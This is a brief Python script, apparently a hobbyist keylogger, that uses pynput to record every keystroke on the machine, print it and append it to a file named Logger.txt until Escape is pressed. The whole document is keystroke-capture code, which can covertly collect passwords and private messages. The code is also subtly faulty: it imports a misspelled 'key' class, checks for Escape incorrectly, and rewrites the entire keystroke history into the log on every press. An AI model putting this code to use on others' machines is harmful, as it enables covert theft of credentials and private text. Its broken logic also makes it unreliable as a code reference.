import pynput
from pynput.keyboard import key,Listener

List=[]
def on_press(key):
    List.append(key)
    write_1(List)
    print(key)
    
def write_1(variable):
    with open('Logger.txt','a') as m:
        for i in variable:
            newvar=str(i).replace("'","")
            m.write(newvar)
            m.write(' ')
            
def on_release(key):
    if key==key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
    